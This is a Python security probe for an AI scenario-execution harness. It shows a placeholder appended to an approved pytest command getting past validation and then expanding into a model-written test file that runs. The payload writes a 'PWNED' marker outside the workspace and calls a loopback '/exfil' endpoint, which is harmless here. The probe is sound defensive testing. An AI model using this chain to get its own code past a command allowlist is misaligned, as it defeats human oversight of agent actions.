"""D-SAFETY end-to-end execution probe: the fixture -> approved-prefix chain.

HARMLESS AND LOCAL. The payload:
  * writes one marker file into this probe's own temp directory (proving a write
    outside the target workspace is reachable), and
  * makes one HTTP GET to a loopback listener this script itself starts on
    127.0.0.1:45999 (proving arbitrary model-authored code ran, and that it can
    open an outbound socket).

Nothing else. No credentials are read, nothing is deleted, no external host is
contacted.

The chain under test:
  1. a `fixture` action writes model-authored *content* under a model-chosen
     bare *name* into the run's evidence directory;
  2. a `command` action extends an approved pytest entry with the tail
     ` {{fixture:test_pwn.py}}`;
  3. `scenario_validation` sees only the literal placeholder — no shell operator,
     no control character — and ADMITS the command;
  4. `ScenarioExecutor._substitute` expands the placeholder into the fixture's
     absolute path AFTER validation, and pytest imports and executes it.
"""

from __future__ import annotations

import asyncio
import http.server
import json
import shutil
import socketserver
import subprocess
import sys
import tempfile
import threading
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT))

from neyma_product_driver.config import ScenarioRunConfig  # noqa: E402
from neyma_product_driver.scenario_plan import (  # noqa: E402
    GeneratedAction,
    GeneratedScenario,
    RiskCategory,
    ScenarioProvenance,
    compile_to_scenario,
)
from neyma_product_driver.scenario_validation import (  # noqa: E402
    ApprovedCommands,
    ValidationContext,
    validate_scenario,
)
from neyma_product_driver.scenarios import Scenario, ScenarioExecutor  # noqa: E402

PORT = 45999
HITS: list[str] = []


class _Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self) -> None:  # noqa: N802
        HITS.append(self.path)
        self.send_response(204)
        self.end_headers()

    def log_message(self, *a: object) -> None:
        return


def main() -> int:
    tmp = Path(tempfile.mkdtemp(prefix="dsafety-"))
    workspace = tmp / "target-repo"          # the "product" workspace
    outside = tmp / "outside-workspace"      # deliberately NOT the workspace
    (workspace / "eval" / "tests").mkdir(parents=True)
    outside.mkdir()
    marker = outside / "PWNED.txt"

    py = str(ROOT / ".venv" / "bin" / "python")
    (workspace / "pytest-canonical.ini").write_text("[pytest]\n", encoding="utf-8")
    (workspace / "eval" / "tests" / "test_a.py").write_text(
        "def test_ok():\n    assert True\n", encoding="utf-8"
    )

    # A human-authored base scenario. Its single approved command is a pytest
    # invocation of exactly the shape scenarios/backend_generic.yaml already uses.
    approved_entry = f"{py} -m pytest -c pytest-canonical.ini eval/tests/test_a.py -q"
    base = Scenario(
        name="base",
        app_url="",
        commands=[{"name": "suite", "run": approved_entry}],
    )
    approved = ApprovedCommands.from_sources(scenarios=[base], configured=[])

    payload = (
        "import pathlib, urllib.request\n"
        f"pathlib.Path({str(marker)!r}).write_text('written by model-authored fixture content')\n"
        f"urllib.request.urlopen('http://127.0.0.1:{PORT}/exfil?ok=1', timeout=5).read()\n"
        "def test_noop():\n    assert True\n"
    )

    generated = GeneratedScenario(
        id="probe-fixture-chain",
        title="probe",
        purpose="demonstrate the fixture -> approved-prefix substitution chain" + " " * 10,
        risk_category=RiskCategory.HAPPY_PATH,
        requirement_reference="AC-PROBE-001",
        product_principle_reference="product rubric",
        isolation_note="temp workspace",
        expected_observations=["1 passed"],
        actions=[
            GeneratedAction(kind="fixture", fixture_name="test_pwn.py", fixture_content=payload),
            GeneratedAction(
                kind="command",
                name="run suite",
                command=approved_entry + " {{fixture:test_pwn.py}}",
                expect_exit_code=0,
            ),
        ],
        provenance=ScenarioProvenance(
            task_hash="probe", stage="initial", model="d-safety-probe", wave=1,
            generating_risk="probe",
        ),
    )

    context = ValidationContext(
        approved_commands=approved,
        grounding_tokens={"probe-unit"},
        principle_tokens={"product rubric"},
        app_url="",
        browser_enabled=False,
    )
    reasons = validate_scenario(generated, context)

    result: dict = {
        "validation_reasons": reasons,
        "validation_admitted": not reasons,
        "approved_entry": approved_entry,
        "generated_command": generated.actions[1].command,
    }

    if reasons:
        result["executed"] = False
        print(json.dumps(result, indent=2))
        return 0

    allowed, _ = approved.resolve(generated.command_strings())
    compiled = compile_to_scenario(generated, base=base, approved_commands=allowed)
    result["compiled_step_command"] = compiled.steps[1].command.run

    httpd = socketserver.TCPServer(("127.0.0.1", PORT), _Handler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    try:
        executor = ScenarioExecutor(workspace, ScenarioRunConfig(), tmp / "artifacts")
        res = asyncio.run(executor.execute(compiled))
    finally:
        httpd.shutdown()

    result["executed"] = True
    result["marker_file_written_outside_workspace"] = marker.exists()
    result["marker_path"] = str(marker)
    result["loopback_listener_hits"] = list(HITS)
    result["fixtures_written"] = list(res.fixtures_written)
    result["command_actually_run"] = [c.command for c in res.commands]
    result["command_exit_codes"] = [c.exit_code for c in res.commands]

    print(json.dumps(result, indent=2))
    Path(__file__).with_name("probe_execute.json").write_text(
        json.dumps(result, indent=2), encoding="utf-8"
    )
    shutil.rmtree(tmp, ignore_errors=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
